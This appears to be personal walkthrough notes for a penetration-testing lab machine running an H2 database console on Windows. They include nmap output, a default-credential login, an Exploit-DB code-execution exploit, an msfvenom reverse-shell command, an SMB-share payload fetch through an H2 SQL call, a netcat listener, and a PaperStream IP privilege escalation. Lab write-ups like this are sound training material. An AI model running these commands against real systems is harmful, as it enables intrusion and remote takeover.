Level: Intermediate

NMAP scan results
```
PORT      STATE  SERVICE       REASON          VERSION
80/tcp    open   http          syn-ack ttl 125 Microsoft IIS httpd 10.0
|_http-title: H2 Database Engine (redirect)
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
135/tcp   open   msrpc         syn-ack ttl 125 Microsoft Windows RPC
139/tcp   open   netbios-ssn   syn-ack ttl 125 Microsoft Windows netbios-ssn
445/tcp   open   microsoft-ds? syn-ack ttl 125
5040/tcp  open   unknown       syn-ack ttl 125
7680/tcp  closed pando-pub     reset ttl 125
8082/tcp  open   http          syn-ack ttl 125 H2 database http console
|_http-title: H2 Console
|_http-favicon: Unknown favicon MD5: D2FBC2E4FB758DC8672CDEFB4D924540
| http-methods: 
|_  Supported Methods: GET POST
9092/tcp  open   XmlIpcRegSvc? syn-ack ttl 125
49664/tcp open   msrpc         syn-ack ttl 125 Microsoft Windows RPC
49665/tcp open   msrpc         syn-ack ttl 125 Microsoft Windows RPC
49666/tcp open   msrpc         syn-ack ttl 125 Microsoft Windows RPC
49667/tcp open   msrpc         syn-ack ttl 125 Microsoft Windows RPC
49668/tcp open   msrpc         syn-ack ttl 125 Microsoft Windows RPC
49669/tcp open   msrpc         syn-ack ttl 125 Microsoft Windows RPC

Host script results:
|_clock-skew: 0s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-12-16T06:27:00
|_  start_date: N/A
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 60735/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 59715/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 18292/udp): CLEAN (Timeout)
|   Check 4 (port 55772/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
```

nmap scan specific for smb vulnerability result -> nothing vulnerable


port 80 - h2 database engine
![](../../Assets/Screenshot%202025-12-16%20at%202.25.32%20PM.png)

port 8082: h2 database http console

![](../../Assets/Screenshot%202025-12-16%20at%202.32.22%20PM.png)
username default: sa
default password: empty

![](../../Assets/Screenshot%202025-12-16%20at%202.35.14%20PM.png)
version number: 1.4.199

search that through searchsploit
![](../../Assets/Screenshot%202025-12-16%20at%202.35.55%20PM.png)

In exploitdb: run each portion at a time (run --Write native library part first, then --Load native library then evalute script)

![](../../Assets/Screenshot%202025-12-16%20at%202.40.38%20PM.png)


we can see whoami returns `jacko\tony`
![](../../Assets/Screenshot%202025-12-16%20at%202.41.24%20PM.png)

systeminfo to find -> windows 10 and x64 machine

generate a payload
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.186 LPORT=7777 -o shell.exe -f exe -a x64
```


![](../../Assets/Screenshot%202025-12-16%20at%203.11.50%20PM.png)
executing it doesn't seem to work
```
impacket-smbserver -smb2support evil $PWD 
```

```
nc -lnvp 7777
```
Another way to transfer the file: smb
```
CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("//192.168.45.219/evil/shell.exe").getInputStream()).useDelimiter("\\Z").next()');
```
managed to catch the reverse shell 

## Privilege Escalation

set path variable
```
set PATH=%PATH%C:\Windows\System32;C:\Windows\System32\WindowsPowerShell\v1.0;
```


Search Program Files (x86) -> Found PaperStream IP -> search vulnerability -> found one in 1.42

check version -> is 1.42 

download this ps file:
https://www.exploit-db.com/exploits/49382

the msfvenom payload dll is created using x86 and not x64 because the paperstream is in x86 (so be careful about that)

execute payload, catch reverse shell

